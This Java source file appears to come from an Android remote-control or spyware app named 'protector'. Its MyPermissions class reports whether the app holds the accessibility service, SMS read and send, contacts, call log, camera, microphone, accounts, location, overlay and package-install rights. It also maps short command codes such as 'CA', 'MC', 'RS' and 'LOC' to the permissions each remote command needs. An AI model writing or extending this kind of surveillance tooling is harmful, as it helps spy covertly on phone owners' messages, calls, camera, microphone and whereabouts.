package com.icontrol.protector;

import static com.icontrol.protector.UtliTools.isPermissionDeclaredInManifest;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import org.json.JSONObject;

public class MyPermissions {
    public enum Prims {
        Files,
        Camera,
        Microphone,
        SMS,
        Contacts
        //Location,
    }


    @RequiresApi(api = Build.VERSION_CODES.M)
    public static String Load(Context ctx) {
        JSONObject json = new JSONObject();

        try {


            json.put(Consts.Time_Stamp, UtliTools.FullStamp());
            json.put(Consts.Accessibility_Service, MyCods.is_Access_Enabled(ctx, AccessServices.class));
            json.put(Consts.Read_Contacts, ctx.checkSelfPermission("android.permission.READ_CONTACTS") == PackageManager.PERMISSION_GRANTED);
            json.put(Consts.Read_SMS, ctx.checkSelfPermission("android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED);
            json.put(Consts.Read_Call_Log, ctx.checkSelfPermission("android.permission.READ_CALL_LOG") == PackageManager.PERMISSION_GRANTED);
            json.put(Consts.Acc_Camera, ctx.checkSelfPermission("android.permission.CAMERA") == PackageManager.PERMISSION_GRANTED);
            json.put(Consts.Get_Accounts, ctx.checkSelfPermission("android.permission.GET_ACCOUNTS") == PackageManager.PERMISSION_GRANTED);
            json.put(Consts.Record_Audio, ctx.checkSelfPermission("android.permission.RECORD_AUDIO") == PackageManager.PERMISSION_GRANTED);

            json.put("Location",
                    ctx.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == PackageManager.PERMISSION_GRANTED
                            && ctx.checkSelfPermission("android.permission.ACCESS_COARSE_LOCATION") == PackageManager.PERMISSION_GRANTED);
            //json.put("Location", false);
            json.put(Consts.Call_Phone, ctx.checkSelfPermission("android.permission.CALL_PHONE") == PackageManager.PERMISSION_GRANTED);

            json.put(Consts.Call_Record, false);
            json.put(Consts.Send_SMS, ctx.checkSelfPermission("android.permission.SEND_SMS") == PackageManager.PERMISSION_GRANTED);
            json.put(Consts.Set_Wallpaper, ctx.checkSelfPermission("android.permission.SET_WALLPAPER") == PackageManager.PERMISSION_GRANTED);
            json.put(Consts.Doze_Mode, UtliTools.IsIgnore_Battery(ctx));
            json.put(Consts.Draw_Overlays, Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(ctx));
            json.put(Consts.Package_Installs, Build.VERSION.SDK_INT < Build.VERSION_CODES.O || ctx.getPackageManager().canRequestPackageInstalls());

            json.put(Consts.write_settings_sys, false);
            //json.put(Consts.write_settings_sys,Settings.System.canWrite(ctx));


            boolean filesallowed = false;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                filesallowed = Environment.isExternalStorageManager();

            } else {
                String[] filesp = MyPermissions.GetPrimname(MyPermissions.Prims.Files);
                filesallowed = MyPermissions.hasPermissions(ctx, filesp);
            }
            json.put(Consts.file_acc_state, String.valueOf(filesallowed));

            boolean ispostok = true;
            if (Build.VERSION.SDK_INT >= 33) {
                if (ctx.checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                    ispostok = false;
                }
            }
            json.put(Consts.Post_Noty, ispostok);


        } catch (Exception e) {
            e.printStackTrace();
        }

        return json.toString();
    }

    public static String[] GetPrimname(Prims pr) {
        ArrayList<String> listp = new ArrayList<String>();
        switch (pr) {
            case Files:
                listp.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
                listp.add(Manifest.permission.READ_EXTERNAL_STORAGE);
                break;
            case Camera:
                listp.add(Manifest.permission.CAMERA);
                break;
            case Microphone:
                listp.add(Manifest.permission.RECORD_AUDIO);
                //listp.add(Manifest.permission.CALL_PHONE);
                break;
            case SMS:
                listp.add(Manifest.permission.READ_SMS);
                break;
            case Contacts:
                listp.add(Manifest.permission.READ_CONTACTS);
//                listp.add(Manifest.permission.WRITE_CONTACTS);
//                listp.add(Manifest.permission.READ_CALL_LOG);
                break;
//            case Location:
//                listp.add(Manifest.permission.ACCESS_FINE_LOCATION);
//                listp.add(Manifest.permission.ACCESS_COARSE_LOCATION);
//                listp.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
//                break;
        }
        String[] Arryprims = listp.toArray(new String[listp.size()]);
        return Arryprims;
    }

    public static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    public static String[] ALL_PERMISSIONS(Context ctx) {
        List<String> permissions = new ArrayList<>();
        ConfigManager cf = ConfigManager.getInstance();
        if (cf.req_files) {
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.R) {
                permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
                permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
        }

        if (cf.req_Rcontct) {
            permissions.add(Manifest.permission.READ_CONTACTS);
            permissions.add(Manifest.permission.WRITE_CONTACTS);
            // permissions.add(Manifest.permission.READ_PHONE_NUMBERS);
        }

        if (cf.req_sms) {
            permissions.add(Manifest.permission.READ_SMS);
        }
        if (cf.req_ssms) {
            permissions.add(Manifest.permission.SEND_SMS);
        }

        //permissions.add(Manifest.permission.READ_CALL_LOG);

        if (cf.req_cam) {
            permissions.add(Manifest.permission.CAMERA);
        }


        // boolean declared = isPermissionDeclaredInManifest(ctx, Manifest.permission.READ_PHONE_STATE);
        // if (declared) {

        permissions.add(Manifest.permission.READ_PHONE_STATE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            permissions.add(Manifest.permission.READ_PHONE_NUMBERS);
        }
        //}


        if (cf.req_accunts) {
            permissions.add(Manifest.permission.GET_ACCOUNTS);
        }


        if (cf.req_mic) {
            permissions.add(Manifest.permission.RECORD_AUDIO);
        }


        permissions.add(Manifest.permission.CHANGE_WIFI_STATE);

        permissions.add(Manifest.permission.ACCESS_WIFI_STATE);

        permissions.add(Manifest.permission.ACCESS_NETWORK_STATE);

        permissions.add(Manifest.permission.WAKE_LOCK);

        permissions.add(Manifest.permission.INTERNET);
        //permissions.add(Manifest.permission.SCHEDULE_EXACT_ALARM);
        //permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);

        //permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
//        if (Build.VERSION.SDK_INT >= 33 && cf.req_notification) {
//            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
//        }

        if (cf.req_location) {
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        }

//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
//            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
//        }
        Iterator<String> iter = permissions.iterator();
        while (iter.hasNext()) {
            String perm = iter.next();
            if (!isPermissionDeclaredInManifest(ctx, perm)) {
                iter.remove();
            }
        }
        return permissions.toArray(new String[0]);
    }

    public static String[] GetRequierdPrims(String Command) {
        try {
            String[] RP;
            ArrayList<String> ListPrims = new ArrayList<>();

            if (Command.contains("FA")) {
                ListPrims.add("android.permission.READ_EXTERNAL_STORAGE");
                ListPrims.add("android.permission.WRITE_EXTERNAL_STORAGE");
            }

            if (Command.contains("CA")) {
                ListPrims.add("android.permission.CAMERA");
            }

            if (Command.contains("MC")) {
                ListPrims.add("android.permission.RECORD_AUDIO");
            }


            if (Command.contains("SS")) {
                ListPrims.add("android.permission.SEND_SMS");
            }

//            if (Command.contains("RC"))
//            {
//                ListPrims.add("android.permission.PROCESS_OUTGOING_CALLS");
//
//            }

            if (Command.contains("SW")) {
                ListPrims.add("android.permission.SET_WALLPAPER");
            }

            if (Command.contains("RS")) {
                ListPrims.add("android.permission.READ_SMS");
            }

            if (Command.contains("RCG")) {
                ListPrims.add("android.permission.READ_CALL_LOG");
            }

            if (Command.contains("CRC")) {
                ListPrims.add("android.permission.READ_CONTACTS");
            }

            if (Command.contains("GA")) {
                ListPrims.add("android.permission.GET_ACCOUNTS");
            }

            if (Command.contains("LOC")) {
                ListPrims.add("android.permission.ACCESS_FINE_LOCATION");
//                ListPrims.add("android.permission.ACCESS_BACKGROUND_LOCATION");
                ListPrims.add("android.permission.ACCESS_COARSE_LOCATION");

            }

            if (Command.contains("NT")) {
                ListPrims.add("android.permission.POST_NOTIFICATIONS");
            }
            RP = new String[ListPrims.size()];
            return ListPrims.toArray(RP);
        } catch (Exception e) {
            return new String[]{"EX", e.getMessage()};
        }

    }
}
